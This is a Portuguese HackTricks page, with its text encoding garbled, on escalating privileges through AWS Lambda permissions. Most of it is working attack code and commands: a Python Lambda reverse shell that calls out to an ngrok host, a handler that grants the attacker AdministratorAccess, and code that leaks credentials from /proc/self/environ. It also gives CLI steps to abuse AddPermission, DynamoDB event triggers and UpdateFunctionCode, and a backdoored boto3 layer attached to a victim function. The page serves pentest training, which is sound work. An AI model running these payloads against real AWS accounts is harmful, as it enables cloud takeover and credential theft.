# AWS - Escala√ß√£o de Privil√©gios no Lambda

<details>

<summary><strong>Aprenda hacking na AWS do zero ao avan√ßado com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

- Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
- Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
- **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## lambda

Mais informa√ß√µes sobre lambda em:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Usu√°rios com as permiss√µes **`iam:PassRole`, `lambda:CreateFunction` e `lambda:InvokeFunction`** podem escalar seus privil√©gios.\
Eles podem **criar uma nova fun√ß√£o Lambda e atribuir a ela uma fun√ß√£o IAM existente**, concedendo √† fun√ß√£o as permiss√µes associadas a essa fun√ß√£o. O usu√°rio pode ent√£o **escrever e fazer upload de c√≥digo para esta fun√ß√£o Lambda (com um rev shell, por exemplo)**.\
Uma vez que a fun√ß√£o esteja configurada, o usu√°rio pode **disparar sua execu√ß√£o** e as a√ß√µes pretendidas invocando a fun√ß√£o Lambda atrav√©s da API da AWS. Esta abordagem permite efetivamente ao usu√°rio realizar tarefas indiretamente por meio da fun√ß√£o Lambda, operando com o n√≠vel de acesso concedido √† fun√ß√£o IAM associada a ela.\\

Um atacante poderia abusar disso para obter um **rev shell e roubar o token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Voc√™ tamb√©m pode **abusar das permiss√µes do papel lambda** da pr√≥pria fun√ß√£o lambda.\
Se o papel lambda tiver permiss√µes suficientes, voc√™ pode us√°-lo para conceder direitos de administrador a voc√™:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Tamb√©m √© poss√≠vel vazar as credenciais da fun√ß√£o lambda sem a necessidade de uma conex√£o externa. Isso seria √∫til para **Lambdas isoladas de rede** usadas em tarefas internas. Se houver grupos de seguran√ßa desconhecidos filtrando suas shells reversas, este trecho de c√≥digo permitir√° vazar diretamente as credenciais como sa√≠da da lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Impacto Potencial:** Privesc direto para a fun√ß√£o de servi√ßo lambda arbitr√°ria especificada.

{% hint style="danger" %}
Note que mesmo que possa parecer interessante **`lambda:InvokeAsync`** n√£o permite por si s√≥ executar `aws lambda invoke-async`, voc√™ tamb√©m precisa de `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Assim como no cen√°rio anterior, voc√™ pode **conceder a si mesmo a permiss√£o `lambda:InvokeFunction`** se tiver a permiss√£o **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Impacto Potencial:** Privesc direto para a fun√ß√£o de servi√ßo lambda arbitr√°ria especificada.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Usu√°rios com permiss√µes de **`iam:PassRole`, `lambda:CreateFunction` e `lambda:CreateEventSourceMapping`** (e potencialmente `dynamodb:PutItem` e `dynamodb:CreateTable`) podem **escalar privil√©gios** indiretamente mesmo sem `lambda:InvokeFunction`.\
Eles podem criar uma **fun√ß√£o Lambda com c√≥digo malicioso e atribuir a ela uma fun√ß√£o IAM existente**.

Em vez de invocar diretamente a Lambda, o usu√°rio configura ou utiliza uma tabela DynamoDB existente, vinculando-a √† Lambda por meio de um mapeamento de origem de evento. Essa configura√ß√£o garante que a fun√ß√£o Lambda seja **acionada automaticamente ao entrar um novo item** na tabela, seja pela a√ß√£o do usu√°rio ou por outro processo, invocando indiretamente a fun√ß√£o Lambda e executando o c√≥digo com as permiss√µes da fun√ß√£o IAM passada.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Se o DynamoDB j√° est√° ativo no ambiente da AWS, o usu√°rio s√≥ precisa **estabelecer o mapeamento da origem do evento** para a fun√ß√£o Lambda. No entanto, se o DynamoDB n√£o estiver em uso, o usu√°rio deve **criar uma nova tabela** com streaming habilitado:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Agora √© poss√≠vel **conectar a fun√ß√£o Lambda √† tabela DynamoDB** criando um **mapeamento de origem de evento**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Com a fun√ß√£o Lambda vinculada ao fluxo do DynamoDB, o atacante pode **ativar indiretamente a Lambda ao ativar o fluxo do DynamoDB**. Isso pode ser feito **inserindo um item** na tabela do DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Impacto Potencial:** Privesc direto para a fun√ß√£o de servi√ßo lambda especificada.

### `lambda:AddPermission`

Um atacante com essa permiss√£o pode **conceder a si mesmo (ou a outros) quaisquer permiss√µes** (isso gera pol√≠ticas baseadas em recursos para conceder acesso ao recurso):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Impacto Potencial:** Escala√ß√£o de privil√©gios diretos para a fun√ß√£o de servi√ßo lambda usada ao conceder permiss√£o para modificar o c√≥digo e execut√°-lo.

### `lambda:AddLayerVersionPermission`

Um atacante com essa permiss√£o pode **conceder a si mesmo (ou a outros) a permiss√£o `lambda:GetLayerVersion`**. Ele poderia acessar a camada e procurar por vulnerabilidades ou informa√ß√µes sens√≠veis.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Impacto Potencial:** Potencial acesso a informa√ß√µes sens√≠veis.

### `lambda:UpdateFunctionCode`

Os usu√°rios que possuem permiss√£o **`lambda:UpdateFunctionCode`** t√™m o potencial de **modificar o c√≥digo de uma fun√ß√£o Lambda existente que est√° vinculada a uma fun√ß√£o IAM.**\
O atacante pode **modificar o c√≥digo da lambda para extrair as credenciais IAM**.

Embora o atacante possa n√£o ter a capacidade direta de invocar a fun√ß√£o, se a fun√ß√£o Lambda j√° existir e estiver operacional, √© prov√°vel que seja acionada por meio de fluxos de trabalho ou eventos existentes, facilitando indiretamente a execu√ß√£o do c√≥digo modificado.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Impacto Potencial:** Privesc direto para a fun√ß√£o de servi√ßo lambda utilizada.

### `lambda:UpdateFunctionConfiguration`

#### Introdu√ß√£o

[**Camadas Lambda**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) permite incluir **c√≥digo** em sua fun√ß√£o lambda, mas **armazenando-o separadamente**, para que o c√≥digo da fun√ß√£o possa permanecer pequeno e **v√°rias fun√ß√µes possam compartilhar c√≥digo**.

Dentro da lambda, voc√™ pode verificar os caminhos de onde o c√≥digo Python √© carregado com uma fun√ß√£o como a seguinte:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Estes s√£o os locais:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Por exemplo, a biblioteca boto3 √© carregada a partir de `/var/runtime/boto3` (4¬™ posi√ß√£o).

#### Explora√ß√£o

√â poss√≠vel abusar da permiss√£o `lambda:UpdateFunctionConfiguration` para **adicionar uma nova camada** a uma fun√ß√£o lambda. Para executar c√≥digo arbitr√°rio, essa camada precisa conter alguma **biblioteca que a lambda vai importar.** Se voc√™ puder ler o c√≥digo da lambda, poder√° encontrar isso facilmente, observe tamb√©m que √© poss√≠vel que a lambda esteja **usando uma camada** e voc√™ poderia **baixar** a camada e **adicionar seu c√≥digo** l√°.

Por exemplo, suponha que a lambda esteja usando a biblioteca boto3, isso criar√° uma camada local com a √∫ltima vers√£o da biblioteca:
```
pip3 install -t ./lambda_layer boto3
```
Pode abrir `./lambda_layer/boto3/__init__.py` e **adicionar a backdoor no c√≥digo global** (uma fun√ß√£o para exfiltrar credenciais ou obter um shell reverso, por exemplo).

Em seguida, compacte o diret√≥rio `./lambda_layer` e **fa√ßa o upload da nova camada lambda** na sua pr√≥pria conta (ou na da v√≠tima, mas voc√™ pode n√£o ter permiss√µes para isso).\
Observe que voc√™ precisa criar uma pasta python e colocar as bibliotecas l√° para substituir /opt/python/boto3. Al√©m disso, a camada precisa ser **compat√≠vel com a vers√£o do python** usada pela lambda e, se voc√™ fizer o upload para sua conta, precisa estar na **mesma regi√£o:**

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

Agora, torne a camada lambda carregada **acess√≠vel por qualquer conta**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
E anexe a camada lambda √† fun√ß√£o lambda da v√≠tima:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
O pr√≥ximo passo seria **invocar a fun√ß√£o** n√≥s mesmos, se pudermos, ou esperar at√© que ela seja **invocada** pelos meios normais - que √© o m√©todo mais seguro.

Uma **maneira mais furtiva de explorar essa vulnerabilidade** pode ser encontrada em:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Impacto Potencial:** Escala√ß√£o direta de privil√©gios para a fun√ß√£o de servi√ßo lambda utilizada.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Talvez com essas permiss√µes voc√™ seja capaz de criar uma fun√ß√£o e execut√°-la chamando a URL... mas eu n√£o consegui encontrar uma maneira de testar, ent√£o me avise se voc√™ conseguir!

### Lambda MitM

Algumas lambdas v√£o estar **recebendo informa√ß√µes sens√≠veis dos usu√°rios nos par√¢metros.** Se conseguir RCE em uma delas, voc√™ pode extrair as informa√ß√µes que outros usu√°rios est√£o enviando para ela, verifique em:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Refer√™ncias

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
